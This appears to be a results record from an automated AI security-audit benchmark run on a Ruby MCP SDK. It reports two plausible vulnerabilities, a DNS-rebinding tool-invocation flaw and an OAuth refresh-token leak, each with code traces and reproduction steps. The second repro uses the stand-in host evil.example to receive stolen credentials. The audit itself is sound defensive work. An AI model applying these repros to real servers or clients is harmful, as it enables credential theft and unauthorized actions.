@@ -1,0 +1,170 @@
+{
+ "arm": "A",
+ "repo": "rubysdk-dos2",
+ "rep": 2,
+ "model": "haiku",
+ "suite": "cvefix",
+ "config_id": "d187b793",
+ "status": "success",
+ "gen_cost": 0.09101634000000002,
+ "trace": {
+  "tools": {
+   "Glob": 1,
+   "Read": 12,
+   "Grep": 3,
+   "StructuredOutput": 1
+  },
+  "skills": [],
+  "reads": [
+   "/tmp/egf-_gubdhfs/r/lib/mcp/server/transports/streamable_http_transport.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/client/oauth/flow.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/client/oauth/discovery.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/client/stdio.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/client/http.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/server.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/server/pagination.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/client/oauth/storage_backed_provider.rb",
+   "/tmp/egf-_gubdhfs/r/lib/json_rpc_handler.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/client/oauth/pkce.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/configuration.rb",
+   "/tmp/egf-_gubdhfs/r/lib/mcp/client/oauth/provider.rb"
+  ]
+ },
+ "findings": [
+  {
+   "finding": {
+    "id": "F1",
+    "file": "lib/mcp/server/transports/streamable_http_transport.rb",
+    "line": 90,
+    "claim": "StreamableHTTPTransport never validates the Origin or Host header, so a DNS-rebinding page can drive an unauthenticated local MCP server and invoke tools.",
+    "source": "Any HTTP request whose Origin/Host is attacker-controlled, including a browser page on a rebound hostname that resolves to the server's loopback or private address.",
+    "sink": "tools/call dispatch: MCP::Server#call_tool (lib/mcp/server.rb:617-665) reached via handle_regular_request -> dispatch_handle_json.",
+    "trace": [
+     {
+      "file": "lib/mcp/server/transports/streamable_http_transport.rb",
+      "line": 90,
+      "note": "handle_request routes POST/GET/DELETE with no Origin/Host check."
+     },
+     {
+      "file": "lib/mcp/server/transports/streamable_http_transport.rb",
+      "line": 365,
+      "note": "handle_post runs Accept (528) and Content-Type (547) checks only; neither is an origin control."
+     },
+     {
+      "file": "lib/mcp/server/transports/streamable_http_transport.rb",
+      "line": 392,
+      "note": "initialize requests skip the session check entirely (no credential required)."
+     },
+     {
+      "file": "lib/mcp/server/transports/streamable_http_transport.rb",
+      "line": 646,
+      "note": "handle_initialization mints a UUID session for any caller (652); no authentication."
+     },
+     {
+      "file": "lib/mcp/server/transports/streamable_http_transport.rb",
+      "line": 713,
+      "note": "handle_regular_request on the new session id (validate_and_touch_session only checks existence and expiry)."
+     },
+     {
+      "file": "lib/mcp/server/transports/streamable_http_transport.rb",
+      "line": 791,
+      "note": "dispatch_handle_json -> server_session.handle_json -> Server#handle_request."
+     },
+     {
+      "file": "lib/mcp/server.rb",
+      "line": 617,
+      "note": "call_tool executes the registered tool handler."
+     }
+    ],
+    "guards_checked": "Accept header (528-539), Content-Type application/json (547-557), session id is an unguessable SecureRandom.uuid (652), MCP-Protocol-Version header (585-595). Case-insensitive grep of lib/ finds no Origin/Host handling anywhere. The SDK ships no authentication, so exploitability depends on the integrator binding to loopback or private interfaces and exposing side-effecting tools. The MCP transport spec says servers MUST validate Origin, so this is a spec gap.",
+    "repro": "Serve the Rack app on 127.0.0.1 with a tool that has side effects. From a page on an attacker-controlled hostname rebound to 127.0.0.1, POST {\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"initialize\",...} with Accept: application/json, text/event-stream, then POST tools/call with the returned Mcp-Session-Id. The request is same-origin from the browser's view, so CORS preflight never applies.",
+    "verdict": "PLAUSIBLE"
+   },
+   "verdict": null,
+   "verdict_status": "skipped"
+  },
+  {
+   "finding": {
+    "id": "F2",
+    "file": "lib/mcp/client/oauth/flow.rb",
+    "line": 237,
+    "claim": "The OAuth client sends stored refresh_token and client_secret, and may run dynamic registration, against an authorization server chosen by server-supplied PRM. Nothing binds that authorization server to the MCP server's origin or to an allowlist.",
+    "source": "The resource_metadata URL taken from the WWW-Authenticate header of a 401 or 403 from the MCP endpoint (lib/mcp/client/http.rb:465-470), and the authorization_servers[0] entry in the PRM document fetched from that URL (flow.rb:308-327).",
+    "sink": "Token-endpoint POST carrying the refresh_token form field and client credentials (flow.rb:661-669 -> 674-737; client_secret as Basic auth at 696, form body at 707). Also DCR POST at registration_endpoint (flow.rb:442-447).",
+    "trace": [
+     {
+      "file": "lib/mcp/client/http.rb",
+      "line": 415,
+      "note": "run_oauth_flow! is triggered by Faraday::UnauthorizedError from the MCP endpoint."
+     },
+     {
+      "file": "lib/mcp/client/http.rb",
+      "line": 465,
+      "note": "parse_www_authenticate_from_error reads the attacker-influenced resource_metadata param."
+     },
+     {
+      "file": "lib/mcp/client/http.rb",
+      "line": 494,
+      "note": "attempt_refresh -> flow.refresh!(server_url:, resource_metadata_url:)."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 138,
+      "note": "refresh_token read from provider storage."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 141,
+      "note": "stored client_information (client_id and client_secret) loaded."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 157,
+      "note": "locate_authorization_server called with the attacker-supplied resource_metadata_url."
+     },
+     {
+      "file": "lib/mcp/client/oauth/discovery.rb",
+      "line": 79,
+      "note": "protected_resource_metadata_urls puts resource_metadata_url first in the probe list."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 208,
+      "note": "fetch_protected_resource_metadata GETs that URL (fetch_metadata_json, 333-367)."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 237,
+      "note": "first authorization_servers entry checked only for https; no origin, allowlist, or same-host check."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 262,
+      "note": "issuer must equal the discovery URL; an attacker-hosted AS trivially satisfies this."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 266,
+      "note": "ensure_secure_endpoints! requires https token_endpoint only."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 178,
+      "note": "exchange_refresh_token posts refresh_token and client credentials to that AS."
+     },
+     {
+      "file": "lib/mcp/client/oauth/flow.rb",
+      "line": 696,
+      "note": "client_secret sent as Basic auth to the attacker-chosen token_endpoint."
+     }
+    ],
+    "guards_checked": "HTTPS-only for resource_metadata and authorization_servers and token_endpoint (flow.rb:153-154, 237, 266; discovery.rb:181-194). Issuer equality (flow.rb:262), which the attacker satisfies by self-hosting. PRM resource coverage (flow.rb:513-525), which applies only when PRM supplies a resource field and is omitted by an attacker. OAuthURLGuard (http.rb:37-55, 354), which covers only MCP-endpoint requests, not flow's token requests, since flow.rb uses its own Faraday client (785-794). No allowlist, no origin binding between authorization_servers and server_url. Precondition: the client already holds a refresh_token or client_secret from a prior legitimate grant, and the MCP endpoint is hostile or compromised. A hostile server already sees the bearer token, so the marginal loss is the persistent refresh_token and client_secret.",
+    "repro": "Connect with an oauth provider holding a refresh_token for AS-A. Have the MCP URL return 401 with WWW-Authenticate: Bearer resource_metadata=\"https://evil.example/prm\". evil.example serves {\"authorization_servers\":[\"https://evil.example\"]} and https://evil.example/.well-known/oauth-authorization-server with issuer=https://evil.example and token_endpoint=https://evil.example/token. The SDK POSTs refresh_token and client_id/client_secret to evil.example/token.",
+    "verdict": "PLAUSIBLE"
+   },
+   "verdict": null,
+   "verdict_status": "skipped"
+  }
+ ],
+ "verify_cost": 0.0
+}
